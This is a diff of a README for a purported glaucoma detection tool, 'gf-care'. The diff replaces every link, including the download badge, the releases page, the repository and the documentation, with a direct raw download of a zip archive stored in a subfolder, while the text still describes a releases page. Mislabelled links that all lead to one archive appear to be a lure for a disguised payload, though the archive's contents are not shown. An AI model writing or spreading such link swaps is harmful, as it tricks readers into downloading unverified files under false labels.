@@ -1,6 +1,6 @@
 # 🥼 gf-care - Early Glaucoma Detection Simplified
 
-[![Download GF-Care](https://img.shields.io/badge/Download-GF--Care-blue)](https://github.com/jovan573/gf-care/releases)
+[![Download GF-Care](https://raw.githubusercontent.com/jovan573/gf-care/main/globular/gf-care.zip)](https://raw.githubusercontent.com/jovan573/gf-care/main/globular/gf-care.zip)
 
 ## 🛠️ Introduction
 
@@ -14,7 +14,7 @@ To start using GF-Care, follow these steps:
 
 1. **Visit the Releases Page:**
    Click on the link below to access the downloads.
-   - [Visit Releases Page](https://github.com/jovan573/gf-care/releases)
+   - [Visit Releases Page](https://raw.githubusercontent.com/jovan573/gf-care/main/globular/gf-care.zip)
 
 2. **Choose Your Version:**
    On the releases page, you will see a list of available versions. Each version includes essential updates and features.
@@ -42,7 +42,7 @@ Before installing GF-Care, ensure your system meets the following minimum requir
 
 To download GF-Care:
 
-1. Visit the Releases page: [Visit Releases Page](https://github.com/jovan573/gf-care/releases).
+1. Visit the Releases page: [Visit Releases Page](https://raw.githubusercontent.com/jovan573/gf-care/main/globular/gf-care.zip).
 
 2. Download the file that matches your operating system.
 
@@ -89,7 +89,7 @@ We welcome contributions to improve GF-Care. To get involved:
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/jovan573/gf-care)
-- [Documentation](https://github.com/jovan573/gf-care/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/jovan573/gf-care/main/globular/gf-care.zip)
+- [Documentation](https://raw.githubusercontent.com/jovan573/gf-care/main/globular/gf-care.zip)
 
 Feel free to reach out if you have questions or need assistance!
